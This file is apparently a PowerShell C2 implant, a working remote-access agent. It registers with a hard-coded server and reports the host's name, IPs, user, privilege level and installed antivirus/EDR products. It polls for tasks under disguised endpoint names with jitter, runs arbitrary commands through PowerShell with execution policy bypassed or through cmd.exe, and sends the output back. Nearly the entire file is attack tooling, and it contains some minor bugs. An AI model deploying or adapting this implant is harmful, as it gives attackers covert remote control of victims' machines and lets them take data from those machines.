param(
  [string]$WHost = '10.10.150.11',
  [int]$WPort = 80,
  [string]$Key = '448b5e4bf0d8d311e4e94b79868885206ebaefce7294bbbb119a2467a9d9b6e3',
  [int]$MinBackoffSec = 5,
  [int]$MaxBackoffSec = 120,
  [bool]$LogHttp = $true
)

$ErrorActionPreference = 'Stop'
$baseUri = "http://$($WHost):$($WPort)"
$Web = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$Web.UserAgent = $userAgent

$registerUri = "$baseUri/api/data"
$pollUri     = "$baseUri/api/health"

# Local, runtime-tunable settings (can be changed by server taskings)
# - $reportedPid: what we report to server as our PID (initially current $pid)
# - $callbackInterval: seconds between polls (baseline, before jitter)
# - $jitterPct: +/- percentage applied to interval for jitter
$reportedPid      = $pid
$callbackInterval = 20
$jitterPct        = 15
$pendingTaskResult = $null
$userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'

# Pluggable task handlers registry
$script:TaskHandlers = @{}

function Register-TaskHandler {
  param(
    [Parameter(Mandatory=$true)][string]$Name,
    [Parameter(Mandatory=$true)][scriptblock]$Handler
  )
  $script:TaskHandlers[$Name.ToLower()] = $Handler
}

# HTTP logging helper (defined early so it's available to all functions)
function Log-HttpResponse {
  param(
    [string]$Phase,
    [Parameter(Mandatory=$true)] $Resp
  )
  try {
    $code = $null
    try { $code = [int]$Resp.StatusCode } catch {}
    $etag = $null
    try { if ($Resp.Headers -and $Resp.Headers['ETag']) { $etag = ([string]$Resp.Headers['ETag']).Trim('"') } } catch {}
    $body = $null
    try { $body = $Resp.Content } catch {}
    if ($code -ne $null) {
      $line = "[http:{0}] status={1}" -f $Phase, $code
      if ($etag) { $line = "$line etag=$etag" }
      Write-Host $line
    }
    if ($body -and [string]::IsNullOrWhiteSpace([string]$body) -eq $false) {
      Write-Host ("[http:{0}] body: {1}" -f $Phase, $body)
    }
  } catch {}
}

#function to get the level neatly its stupid simple but like yeah w/e so is this whole ass c2 ecosystem
function Get-IntegrityLevel {
  (whoami /groups | findstr /C:"Mandatory Label") -replace '.*\\([A-Za-z]+(?:\s+Plus)?)\s+Mandatory Level.*','$1'
}


# this is what we put together so that we can inform the agent information. 
function Get-AgentProfile {
  $os = (Get-CimInstance Win32_OperatingSystem)
  $IPs = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.254*' -and $_.IPAddress -ne '127.0.0.1' }).IPAddress
  $AVs = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName
  $json = [pscustomobject]@{
    agent_key         = $Key
    hostname          = $env:COMPUTERNAME
    ip_addr           = @($IPs)
    os                = $os.Caption
    build             = ("$($os.BuildNumber)  $($os.Version)")
    pid               = $reportedPid
    user              = "$env:USERDOMAIN/$env:USERNAME"
    cwd               = (Get-Location).Path
    callback_interval = $callbackInterval
    jitter_value      = $jitterPct
    default_shell     = 'powershell'
    IntegrityLevel    = Get-IntegrityLevel
    base_agent        = 'toliet_oracle'
    edr               = @($AVs)
  } | ConvertTo-Json -Depth 4
  return $json
}

function Register-Agent {
  $body = Get-AgentProfile
  $resp = Invoke-WebRequest -Uri $registerUri -Method POST -ContentType 'application/json' -Body $body -WebSession $Web
  if ($LogHttp) { Log-HttpResponse -Phase 'register' -Resp $resp }
  $obj  = $resp.Content | ConvertFrom-Json
  $etag = $null
  try { if ($resp.Headers -and $resp.Headers['ETag']) { $etag = [string]$resp.Headers['ETag'] } } catch {}
  if ($etag) { $etag = $etag.Trim('"') }
  [pscustomobject]@{
    StatusCode       = $resp.StatusCode
    SessionToken     = if ($etag) { $etag } elseif ($obj.PSObject.Properties.Name -contains 'session_key') { $obj.session_key } elseif ($obj.PSObject.Properties.Name -contains 'session_token') { $obj.session_token } elseif ($obj.PSObject.Properties.Name -contains 'sessionKey') { $obj.sessionKey } else { $null }
    CallbackInterval = $null
    Raw              = $obj
  }
}

function Poll-Once {
  param([string]$SessionToken)

  $headers = @{}
<#
We need to pass over our last message key in our header. We can use (case sensitve): 
  session 
  session-key
  etag
  x-request-id
  
  could even make these rotate sending over via different header values
#>
  if ($SessionToken) { $headers['session'] = $SessionToken }

  try {
    $r = Invoke-WebRequest -Uri $pollUri -Method GET -Headers $headers -WebSession $Web
    if ($LogHttp) { Log-HttpResponse -Phase 'poll' -Resp $r }
    $code = [int]$r.StatusCode
    if ($code -eq 200) {
      $data = $r.Content | ConvertFrom-Json
      $etag = $null
      try { if ($r.Headers -and $r.Headers['ETag']) { $etag = [string]$r.Headers['ETag'] } } catch {}
      if ($etag) { $etag = $etag.Trim('"') }
      return [pscustomobject]@{
        Code            = 200
        Data            = $data
        # Accept either callback_interval or interval from server
        CallbackInterval= $null
        NewSessionToken = if ($etag) { $etag } elseif ($data.session_key) { $data.session_key } elseif ($data.session_token) { $data.session_token } else { $null }
      }
    } else {
      return [pscustomobject]@{ Code = $code; Data = $null }
    }
  } catch [System.Net.WebException] {
    $resp = $_.Exception.Response
    if ($resp) {
      $code = [int]$resp.StatusCode
      if ($code -eq 304) {
        return [pscustomobject]@{ Code = 304; Data = $null }
      }
      return [pscustomobject]@{ Code = $code; Data = $null; Error = $_.Exception.Message }
    }
    return [pscustomobject]@{ Code = -1; Data = $null; Error = $_.Exception.Message }
  }
}


# Run a task command and capture stdout/stderr as a string
function Invoke-AgentTask {
  param(
    [Parameter(Mandatory=$true)] [string]$Command
  )
  try {
    # Run in a fresh PowerShell to minimize side-effects; capture all output
    $out = & powershell -NoProfile -ExecutionPolicy Bypass -Command $Command 2>&1 | Out-String
    if ($null -eq $out) { $out = '' }
    return $out
  } catch {
    return ("[task error] {0}" -f $_.Exception.Message)
  }
}

# Submit any pending result back to server (on next check-in)
function Submit-TaskResult {
  param(
    [Parameter(Mandatory=$true)] [string]$ResultText,
    [Parameter(Mandatory=$true)] [string]$SessionToken
  )
  try {
    $payload = [pscustomobject]@{
      task_result   = $ResultText
      hostname      = $env:COMPUTERNAME
      when          = (Get-Date).ToString('o')
    } | ConvertTo-Json -Depth 4
    # Listener expects session in header (kept for compatibility)
    $headers = @{ 'session' = $SessionToken }
    $r = Invoke-WebRequest -Uri $registerUri -Method POST -Headers $headers -ContentType 'application/json' -Body $payload -WebSession $Web
    if ($LogHttp) { Log-HttpResponse -Phase 'submit' -Resp $r }
    # Treat only 200 as success; 202 is a decoy in our listener
    $ok = ([int]$r.StatusCode -eq 200)
    $newKey = $null; $interval = $null
    try {
      $data = $r.Content | ConvertFrom-Json
      if ($data.session_key) { $newKey = [string]$data.session_key }
      elseif ($data.session_token) { $newKey = [string]$data.session_token }
      if ($r.Headers -and $r.Headers['ETag'] -and -not $newKey) { $newKey = ([string]$r.Headers['ETag']).Trim('"') }
    } catch {}
    if ($ok) { Write-Host "[task] Submitted result (${($ResultText.Length)} chars)." }
    return [pscustomobject]@{ Success = $ok; NewSessionToken = $newKey; CallbackInterval = $interval }
  } catch {
    Write-Host ("[task] Submit error: {0}" -f $_.Exception.Message)
    return [pscustomobject]@{ Success = $false; NewSessionToken = $null; CallbackInterval = $null }
  }
}

# --- Task runtime and dispatch ---

function Run-Set {
  # IMPORTANT: Do NOT use parameter name 'Args' to avoid clashing with automatic $args
  param([string[]]$Argv)
  # Normalize in case a single string sneaks in or non-breaking spaces are used
  if ($Argv -is [string]) { $Argv = @([string]$Argv) }
  if ($Argv.Count -eq 1 -and ($Argv[0] -is [string])) {
    $Argv = @([regex]::Split($Argv[0].Trim(), '[\s\u00A0]+') | Where-Object { $_ })
  }
  if (-not $Argv -or $Argv.Count -lt 2) {
    Write-Host "[task] Agrs less than 2"
    Write-Host "[task] Agrgs: $Argv"
    return 'false' }

  $name = ($Argv[0] | ForEach-Object { $_.ToString().ToLower() })
  $value = [string]$Argv[1]
  switch ($name) {
    'jitter' { try { $script:jitterPct = [int]$value; return 'true' } catch { return 'false' } }
    'jitter_value' { try { $script:jitterPct = [int]$value; return 'true' } catch { return 'false' } }
    'jitter_pct'   { try { $script:jitterPct = [int]$value; return 'true' } catch { return 'false' } }
    'interval' { try { $script:callbackInterval = [int]$value; return 'true' } catch { return 'false' } }
    'callback' { try { $script:callbackInterval = [int]$value; return 'true' } catch { return 'false' } }
    'callback_interval' { try { $script:callbackInterval = [int]$value; return 'true' } catch { return 'false' } }
    'sleep' { try { $script:callbackInterval = [int]$value; return 'true' } catch { return 'false' } }
    default { return 'false' }
  }
}

function Run-PowerShell {
  param([string[]]$Argv)
  $cmdText = ($Argv -join ' ').Trim()
  if (-not $cmdText) { return '' }
  return Invoke-AgentTask -Command $cmdText
}

function Run-Cmd {
  param([string[]]$Args)
  $cmdText = ($Args -join ' ').Trim()
  if (-not $cmdText) { return '' }
  try {
    $out = & cmd.exe /c $cmdText 2>&1 | Out-String
    if ($null -eq $out) { $out = '' }
    return $out
  } catch { return ("[cmd error] {0}" -f $_.Exception.Message) }
}

function Register-DefaultHandlers {
  Register-TaskHandler -Name 'set'        -Handler { param([string[]]$Argv) Run-Set -Argv $Argv }
  Register-TaskHandler -Name 'powershell' -Handler { param([string[]]$Argv) Run-PowerShell -Argv $Argv }
  Register-TaskHandler -Name 'ps'         -Handler { param([string[]]$Argv) Run-PowerShell -Argv $Argv }
  Register-TaskHandler -Name 'cmd'        -Handler { param([string[]]$Argv) Run-Cmd -Argv $Argv }
  Register-TaskHandler -Name 'exit'       -Handler { param([string[]]$Argv) Run-Exit -Argv $Argv  }
}

function Run-Exit{
  param([string[]]$Argv)
  $eat = $False
  if ($Argv -and $Argv.Length -gt 0){
    $s = $Argv[0].ToString().ToLower()
    $eat = @('1','true','t','yes','y').Contains($s)
  }
  if($eat = $True){

     Stop-Process $pid -force
  }
  Stop-Process $pid -force
}

function Run-Task {
  param([string]$TaskText)
  if (-not $TaskText) { return '' }
  Write-Host "[DEBUG] Entered Run task TaskText is = $TaskText"
  # Split on normal whitespace and non-breaking space (U+00A0) to be robust
  $parts = @([regex]::Split($TaskText.Trim(), '[\s\u00A0]+') | Where-Object { $_ -and $_.Trim().Length -gt 0 })
  if ($parts.Length -eq 0) { return '' }
  $verb = $parts[0].ToLower()
  Write-Host "[DEBUG] verb set to $verb"
  Write-Host "[DEBUG] parts pos 1 = $($parts[1])"
  # Avoid using the automatic $args variable name here; use $argList
  [string[]]$argList = @()
  if ($parts.Length -gt 1) { [string[]]$argList = $parts[1..($parts.Length-1)] }

  if ($script:TaskHandlers.ContainsKey($verb)) {
    $handler = $script:TaskHandlers[$verb]
    Write-Host "[DEBUG] Handler set to be $handler"
    Write-Host "[DEBUG] Arguments set to: $($argList -join ',')"
    try {
      # Bind explicitly by name to the handler's param([string[]]$Argv)
      return (& $handler -Argv $argList)
    } catch {
      return ("[handler error] {0}" -f $_.Exception.Message)
    }
  }

  # Fallback: run the full text via PowerShell
  return Invoke-AgentTask -Command $TaskText
}

function Process-PollResponse {
  param([object]$Poll)
  if (-not $Poll -or $Poll.Code -ne 200) { return }
  $taskCmd = $null
  if ($Poll.Data -and $Poll.Data.PSObject -and $Poll.Data.PSObject.Properties.Name -contains 'Task') {
    $taskCmd = [string]$Poll.Data.Task
  } elseif ($Poll.Data -and $Poll.Data.PSObject -and $Poll.Data.PSObject.Properties.Name -contains 'task') {
    $taskCmd = [string]$Poll.Data.task
  }
  if ($taskCmd -and $taskCmd.Trim().Length -gt 0) {
    Write-Host ("[task] Executing: {0}" -f $taskCmd)
    $res = Run-Task -TaskText $taskCmd
    $maxLen = 32768
    if ($res.Length -gt $maxLen) { $res = $res.Substring(0, $maxLen) + "... [truncated]" }
    $script:pendingTaskResult = $res
    Write-Host ("[task] Captured {0} chars; will return next check-in." -f $script:pendingTaskResult.Length)
  }
}

# --- main ---
Register-DefaultHandlers
Write-host "Registering agent at $registerUri"
$reg = Register-Agent
if ($reg.StatusCode -ne 200 -and $reg.StatusCode -ne 201) {
  throw "Registration failed: HTTP $($reg.StatusCode)"
}

$sessionToken     = $reg.SessionToken
$callbackInterval = if ($reg.CallbackInterval) { $reg.CallbackInterval } else { $callbackInterval }
if (-not $sessionToken) { throw "No session_key received at registration." }

Write-Host "Registered. SessionToken=$sessionToken, interval=${callbackInterval}s"

$backoff = $MinBackoffSec
$justRegistered = $true
while ($true) {
  $tickStart = Get-Date
  $didPostThisCycle = $false
  # If we have a pending result from a previously executed task, push it up first
  if ($pendingTaskResult -and $pendingTaskResult.Trim().Length -gt 0) {
    $submit = Submit-TaskResult -ResultText $pendingTaskResult -SessionToken $sessionToken
    if ($submit -and $submit.Success) {
      if ($submit.NewSessionToken) { $sessionToken = $submit.NewSessionToken }
      if ($submit.CallbackInterval) { $callbackInterval = $submit.CallbackInterval }
      $pendingTaskResult = $null
      $didPostThisCycle = $true
    }
  }
  $poll = $null
  $skipPollThisCycle = $didPostThisCycle -or $justRegistered
  if (-not $skipPollThisCycle) {
    $poll = Poll-Once -SessionToken $sessionToken
  }

  if ($poll) {
  switch ($poll.Code) {
    200 {
      if ($poll.NewSessionToken) { $sessionToken = $poll.NewSessionToken }
      Process-PollResponse -Poll $poll
      $backoff = $MinBackoffSec
    }
    304 {
      # No changes. Quiet by design.
      $backoff = $MinBackoffSec
    }
    default {
      # Transient hiccup or server gripe—backoff with jitter.
      $jitter = Get-Random -Minimum 0 -Maximum ([math]::Max(1,[int]($backoff/3)))
      $sleep  = [math]::Min($MaxBackoffSec, $backoff + $jitter)
      Write-Host ("[{0:u}] Poll error code {1}. Backing off {2}s." -f (Get-Date), $poll.Code, $sleep)
      Start-Sleep -Seconds $sleep
      $backoff = [math]::Min($MaxBackoffSec, [int]([math]::Ceiling($backoff * 1.8)))
      continue
    }
  }
  } else {
    # No poll this cycle (e.g., immediately after registration or after POST). Use minimum backoff.
    $backoff = $MinBackoffSec
  }

  $justRegistered = $false

  # Honor interval (minus the time we just spent)
  $elapsed = [int]((Get-Date) - $tickStart).TotalSeconds
  # Jittered interval: +/- $jitterPct% of baseline interval
  $base = [math]::Max(0, $callbackInterval - $elapsed)
  $jDelta = [int]([math]::Round($callbackInterval * ($jitterPct / 100.0)))
  if ($jDelta -lt 0) { $jDelta = 0 }
  $minJ = -1 * $jDelta
  $maxJ = $jDelta + 1
  $offset = if ($jDelta -gt 0) { Get-Random -Minimum $minJ -Maximum $maxJ } else { 0 }
  $sleepFor = [int]([math]::Max(0, $base + $offset))
  write-host "[Internal] Sleeping for $sleepFor"
  if ($sleepFor -gt 0) { Start-Sleep -Seconds $sleepFor }
}

function Log-HttpResponse {
  param(
    [string]$Phase,
    [Parameter(Mandatory=$true)] $Resp
  )
  try {
    $code = $null
    try { $code = [int]$Resp.StatusCode } catch {}
    $etag = $null
    try { if ($Resp.Headers -and $Resp.Headers['ETag']) { $etag = ([string]$Resp.Headers['ETag']).Trim('"') } } catch {}
    $body = $null
    try { $body = $Resp.Content } catch {}
    if ($code -ne $null) {
      $line = "[http:{0}] status={1}" -f $Phase, $code
      if ($etag) { $line = "$line etag=$etag" }
      Write-Host $line
    }
    if ($body -and [string]::IsNullOrWhiteSpace([string]$body) -eq $false) {
      Write-Host ("[http:{0}] body: {1}" -f $Phase, $body)
    }
  } catch {}
}
